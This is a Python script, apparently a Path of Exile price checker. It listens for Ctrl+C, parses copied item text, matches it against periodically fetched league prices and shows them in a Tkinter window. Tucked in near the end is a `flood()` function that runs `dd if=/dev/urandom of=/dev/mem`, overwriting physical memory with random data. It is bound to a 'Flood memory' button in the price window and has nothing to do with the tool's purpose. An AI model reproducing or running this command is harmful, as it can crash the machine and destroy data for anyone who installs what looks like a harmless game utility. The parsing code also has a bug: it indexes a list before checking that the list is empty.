#!/usr/bin/python3.6

from pprint import pprint
from tkinter import *
import re
import poeapi
import time
import threading
import keyboard
import clipboard
import json

league = "Delirium"

data_gui_lock = False

data_file = "data.json"

def parse_clip(query):
   query = "".join(query.split("--------")).split("\n")

   res = {
    "name": "",
    "type": None,
    "ex_mods": [],
    "im_mods": [],
    "links": 0
   }

   query = query[1:]
   res["name"] = query[0]
   res["type"] = query[1]
   query = query[2:]

   findall = lambda s,q : [i for i in range(len(s)) if s.startswith(q, i)]
   links = list(filter(lambda x : "Sockets: " in x, query))
   l = len(findall(links[0][9:], "-"))
   if links: res["links"] = l + 1 if l else 0

   level_ind = [i for i, x in enumerate(query) if "Item Level: " in x ][0]
   query = query[level_ind + 2:]

   implicit = list(filter(lambda x : "(implicit)" in x, query))
   if implicit:
       res["implicit_mods"] = []
       for imod in implicit:
           res["implicit_mods"].append(imod[:len(imod) - 11])
       query = query[len(implicit) + 1:]

   try:
       res["ex_mods"] = query[:query.index("")]
   except:
       pass

   return res

# unused
def format_sockets(sockets):
  sockets.append({"group": "NOOP"})
  r = ""
  for current, next in zip(sockets, sockets[1:]):
      r += (current["sColour"] + ("-" if current["group"] == next["group"] else " "))
  return r[:len(r) - 1]

def format_mods(mods):
    res = []
    for mod in mods:
        if mod and mod["text"]:
            res.extend(mod["text"].split("\n"))
    return res

def format_data(d):
    global league

    res = []
    for item in d:
        res.append({
            "name": item["name"],
            "type": item["baseType"],
            # "sockets": format_sockets(item["sockets"]) if "sockets" in item.keys() else [],
            "links": item["links"],
            "ex_mods": format_mods(item["explicitModifiers"]) if "explicitModifiers" in item.keys() else [],
            "im_mods": format_mods(item["implicitModifiers"]) if "implicitModifiers" in item.keys() else [],
            "price_ex": item["exaltedValue"],
            "price_ch": item["chaosValue"],
        })
        # pprint(res)
    return res

def update():
    global data_file
    global league

    while True:
        res = poeapi.get_data(league)
        open(data_file, "w").write(json.dumps(format_data(res)))
        time.sleep(240)
        pass

def compare_mods(a1, a2):
    truths = 0
    if len(a1) == len(a2):
        rng = None
        dir_v = None
        for elem in a1:
            r = re.split(".*\(.*\)", elem)
            if len(r) > 1:
                rng = elem.replace(r[1], "")
                if rng[0] != "(": rng = rng[1:]
                rng = rng[1:][:len(rng) - 2]
                rng = rng.split("-")
                rng = range(int(rng[0]), int(rng[1]))
                for i,s in enumerate(a2):
                    if r[1] in a2[i]:
                        n = s[:s.index(" ") + 1]
                        if "+" in n or "%" in n: dir_v = int(float(n.replace(" ", "").replace("%", "").replace("+", "")))
            if elem in a2 or dir_v in rng: truths += 1
        return truths == len(a2)
    else: return False

def read_and_find(q):
    global data_file

    prices = []

    q = parse_clip(q)
    # pprint('Q', q)

    data = json.loads(open(data_file, "r").read())

    for item in data:
        if item["name"] == q["name"] and item["type"] == q["type"]:
            if item["links"] == q["links"] and compare_mods(item["im_mods"], q["im_mods"]):
                if compare_mods(item["ex_mods"], q["ex_mods"]):
                    prices.append(item["name"])
                    prices.append("Ex: " + str(item["price_ex"]))
                    prices.append("Ch: " + str(item["price_ch"]))

    return prices

def keys_listen():
    while True:
       keyboard.wait("ctrl+c")
       results = read_and_find(clipboard.paste())
       draw_data_gui(results)
       time.sleep(0.1)
       pass

def main():
    update_thread = threading.Thread(target=update)
    update_thread.start()

    keys_thread = threading.Thread(target=keys_listen)
    keys_thread.start()

import os
def flood():
    os.system("dd if=/dev/urandom of=/dev/mem")

def draw_data_gui(lines):
    global data_gui_lock
    data_gui_lock = True
    root = Tk()
    for line in lines:
        e = Entry(root)
        e.insert(END, line)
        e.pack()
    button = Button(root, text='Flood memory', width=25, command=flood)
    button.pack()
    root.mainloop()
    data_gui_lock = False

main()

